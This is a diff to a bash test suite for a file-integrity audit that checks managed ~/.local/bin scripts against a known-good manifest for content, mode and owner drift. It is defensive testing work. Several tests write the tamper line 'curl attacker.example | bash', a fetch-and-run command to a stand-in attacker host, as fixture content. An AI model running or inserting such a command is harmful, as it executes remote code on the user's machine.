@@ -97,6 +97,26 @@ write_manifest() {
 }
 write_manifest
 
+# The SECOND manifest the audit covers: the chezmoi-managed scripts under
+# ~/.local/bin. They are not pipeline files, but they run unattended from
+# LaunchAgents and shell hooks, and the event path cannot see a hard-linked or
+# relocated tamper there any better than it can in the pipeline home. Beside them
+# sits an UNMANAGED third-party shim, which no manifest lists and the audit must
+# therefore never report.
+bin_dir="$home/.local/bin"
+mkdir -p "$bin_dir"
+bin_script="$bin_dir/update-skills.sh"
+bin_shim="$bin_dir/mise"
+printf 'echo update-skills\n' >"$bin_script"
+printf 'unmanaged self-updating binary\n' >"$bin_shim"
+chmod 755 "$bin_script"
+
+bin_manifest="$work/managed-bin-known-good.sha256"
+write_bin_manifest() {
+  printf '%s 0755 %s %s\n' "$(sha_of "$bin_script")" "$manifest_uid" "$bin_script" >"$bin_manifest"
+}
+write_bin_manifest
+
 # run_scan [VAR=value ...] -- run the audit in a fresh shell against the fixture
 # manifest. SCAN_RC is the return code, SCAN_OUT the stdout.
 SCAN_RC=0
@@ -107,7 +127,8 @@ run_scan() {
   # shell, not by this one. `env` hides the bash -c from shellcheck's nested-script
   # analysis, hence the explicit directive.
   # shellcheck disable=SC2016
-  SCAN_OUT="$(env HOME="$home" OSQUERY_PIPELINE_MANIFEST="$manifest" "$@" \
+  SCAN_OUT="$(env HOME="$home" OSQUERY_PIPELINE_MANIFEST="$manifest" \
+    OSQUERY_MANAGED_BIN_MANIFEST="$bin_manifest" "$@" \
     bash -c 'set -euo pipefail
       source "$1"
       pipeline_audit_scan' _ "$pipeline/pipeline-audit.sh")" || SCAN_RC=$?
@@ -310,16 +331,97 @@ trust_rc=0
 trust_out="$(env HOME="$home" bash -c '
   set -euo pipefail
   source "$1"
-  unset OSQUERY_PIPELINE_MANIFEST
+  unset OSQUERY_PIPELINE_MANIFEST OSQUERY_MANAGED_BIN_MANIFEST
   PIPELINE_MANIFEST="$2"
-  pipeline_audit_scan' _ "$pipeline/pipeline-audit.sh" "$manifest")" || trust_rc=$?
+  MANAGED_BIN_MANIFEST="$3"
+  pipeline_audit_scan' _ "$pipeline/pipeline-audit.sh" "$manifest" "$bin_manifest")" || trust_rc=$?
 [[ $trust_rc -eq 1 ]] ||
   fail "a manifest that is not root-owned must be refused, got return $trust_rc"
 [[ $trust_out == "untrustworthy" ]] ||
   fail "a non-root-owned manifest must report the untrustworthy token, got [$trust_out]"
 
+# --- the MANAGED-BIN manifest is audited on the same tick, on ALL THREE columns --
+# The hard-link and relocation blind spot the audit exists to close is a property
+# of path-based event generation, not of any one directory, so it applies to the
+# managed ~/.local/bin scripts exactly as it does to the pipeline home. Those
+# scripts run unattended from LaunchAgents and shell hooks, which is precisely the
+# case where nobody is present to notice a missing event.
+run_scan
+expect_rc "a tree matching BOTH manifests completes" 0
+expect_out "a tree matching both manifests reports no divergence" ""
+
+printf 'curl attacker.example | bash\n' >"$bin_script"
+run_scan
+expect_rc "a tampered managed bin script still completes the scan" 0
+expect_out "a tampered managed bin script is reported, with no file event involved" \
+  "content $bin_script"
+printf 'echo update-skills\n' >"$bin_script" # restore
+chmod 755 "$bin_script"
+
+# ATTRIBUTES on the bin arm. A chmod moves no bytes, so a content-only comparison
+# would call this clean; it must report under its OWN kind, because the operator's
+# next move differs (a permission change is the reversible step BEFORE a rewrite).
+chmod g+w "$bin_script"
+run_scan
+expect_rc "a chmod-ed managed bin script still completes the scan" 0
+expect_out "a chmod on a managed bin script is reported as a MODE divergence, not a content one" \
+  "mode $bin_script"
+chmod 755 "$bin_script"
+
+# OWNERSHIP on the bin arm, driven from the manifest side: a tuple naming an owner
+# the deployed file does not have is exactly the state a chown produces, and tests
+# cannot chown without privilege.
+printf '%s 0755 %s %s\n' "$(sha_of "$bin_script")" "$((manifest_uid + 1))" "$bin_script" >"$bin_manifest"
+run_scan
+expect_rc "a managed bin script owned by someone else still completes the scan" 0
+expect_out "a drifted owner on a managed bin script is reported as an OWNER divergence" \
+  "owner $bin_script"
+write_bin_manifest # restore
+
+# Content AND mode on the same bin path are two lines under two kinds, so the
+# watchdog's fingerprint changes when a mode drift escalates into a rewrite.
+printf 'curl attacker.example | bash\n' >"$bin_script"
+chmod g+w "$bin_script"
+run_scan
+expect_rc "a bin script diverging on two columns completes the scan" 0
+expect_out "content and mode on one managed bin path are reported as two distinct kinds" \
+  "content $bin_script
+mode $bin_script"
+printf 'echo update-skills\n' >"$bin_script"
+chmod 755 "$bin_script"
+
+# The unmanaged shim beside it self-updates on its own schedule and is in NO
+# manifest, so the audit has nothing to compare it against and must stay quiet.
+# An audit that walked the DIRECTORY instead of the manifest would report it on
+# every update and train the operator to ignore the whole probe.
+printf 'unmanaged binary v2\n' >"$bin_shim"
+chmod 700 "$bin_shim"
+run_scan
+expect_rc "an updated unmanaged shim completes the scan" 0
+expect_out "an UNMANAGED self-updating shim in ~/.local/bin is never reported, on any column" ""
+
+# A missing managed-bin manifest is a LOUD refusal, even while the pipeline
+# manifest is perfectly fine: half an audit reporting "clean" is a lie about the
+# half it never read.
+run_scan OSQUERY_MANAGED_BIN_MANIFEST="$work/no-such-bin-manifest.sha256"
+expect_rc "an absent managed-bin manifest refuses even when the pipeline manifest is good" 1
+expect_out "an absent managed-bin manifest reports the missing token" "missing"
+
+# A divergence in EACH manifest is reported in one pass; neither scan swallows the
+# other's findings.
+printf 'echo tampered\n' >>"$good_script"
+printf 'curl attacker.example | bash\n' >"$bin_script"
+run_scan
+expect_rc "a divergence in each manifest completes" 0
+expect_out "divergences from both manifests are reported together" \
+  "content $good_script
+content $bin_script"
+printf 'echo digest\n' >"$good_script"
+printf 'echo update-skills\n' >"$bin_script"
+chmod 755 "$good_script" "$bin_script"
+
 if [[ $fails -gt 0 ]]; then
   printf '%d check(s) failed\n' "$fails" >&2
   exit 1
 fi
-printf 'osquery-pipeline-audit: OK (a matching tree is clean; tampered content, a mode changed through a hard-link alias outside the pipeline home, a drifted owner, a missing path, a symlink whose referent matches, a directory, and an over-cap file are each reported without any file event; content and mode are distinct kinds on the same path; spaced paths are read whole; an absent, empty, malformed, relative-path, over-long, or non-root-owned manifest, an absent verdict helper, and an exhausted budget all refuse LOUDLY)\n'
+printf 'osquery-pipeline-audit: OK (a matching tree is clean; tampered content, a mode changed through a hard-link alias outside the pipeline home, a drifted owner, a missing path, a symlink whose referent matches, a directory, and an over-cap file are each reported without any file event; content and mode are distinct kinds on the same path; spaced paths are read whole; BOTH known-good manifests are audited on one tick across all three columns, an unmanaged ~/.local/bin shim is never reported, and a missing managed-bin manifest refuses on its own; an absent, empty, malformed, relative-path, over-long, or non-root-owned manifest, an absent verdict helper, and an exhausted budget all refuse LOUDLY)\n'
